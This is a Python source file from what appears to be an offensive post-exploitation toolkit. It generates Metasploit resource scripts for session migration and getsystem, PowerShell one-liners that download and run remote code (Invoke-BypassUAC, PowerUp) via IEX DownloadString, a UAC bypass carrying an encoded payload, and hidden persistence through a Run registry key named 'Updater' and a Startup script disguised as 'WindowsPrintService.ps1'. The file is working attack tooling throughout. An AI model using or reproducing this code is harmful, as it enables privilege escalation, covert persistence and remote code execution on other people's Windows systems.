import base64
class EXTRAS(object):
    def UACBYPASS(self,persistencenosleep):
        uacbypassrcfilecontents = """run post/windows/manage/migrate SESSION=1 NAME=explorer.exe SPAWN=false KILL=false\nrun post/windows/manage/exec_powershell SCRIPT=bypassuac.ps1 SESSION=1"""
        uacbypassrcfilecontents2 = """run post/windows/manage/migrate SESSION=2 NAME=spoolsv.exe SPAWN=false KILL=false\nrun post/windows/escalate/getsystem SESSION=2"""
        uacbypassfilecontent = """IEX (New-Object Net.WebClient).DownloadString("https://github.com/PowerShellEmpire/Empire/raw/master/data/module_source/privesc/Invoke-BypassUAC.ps1");\nInvoke-BypassUAC -Command \"powershell -enc %s\" """ % (
            base64.b64encode(persistencenosleep.encode('utf_16_le')))
        with open('bypassuac.ps1', 'w') as uacbypassfile:
            uacbypassfile.write(uacbypassfilecontent)
            uacbypassfile.close()
        with open('uacbypass.rc', 'w') as uacbypassfilerc:
            uacbypassfilerc.write(uacbypassrcfilecontents)
            uacbypassfilerc.close()
        with open('uacbypass2.rc', 'w') as uacbypassfilerc2:
            uacbypassfilerc2.write(uacbypassrcfilecontents2)
            uacbypassfilerc2.close()

    def ALLCHECKS(self):
        with open('allchecks.ps1', 'w') as allchecksfile:
            allchecksfile.write(
                """IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1");invoke-allchecks""")
            allchecksfile.close()

    def PERSISTENCE(self,persistencesleep):
        persistencerc = """run post/windows/manage/smart_migrate\nrun post/windows/manage/exec_powershell SCRIPT=persist.ps1 SESSION=1"""
        with open('persist.ps1', 'w') as persistfile:
            persistfile.write("""$persist = 'New-ItemProperty -Force -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Updater -PropertyType String -Value "`"$($Env:SystemRoot)\System32\WindowsPowerShell\\v1.0\powershell.exe`\" -exec bypass -NonInteractive -WindowStyle Hidden -enc """ +
                              base64.b64encode(persistencesleep.encode('utf_16_le')) + '\"\'; iex $persist; echo $persist > \"$Env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsPrintService.ps1\"')
            persistfile.close()
        with open('persist.rc', 'w') as persistfilerc:
            persistfilerc.write(persistencerc)
            persistfilerc.close()
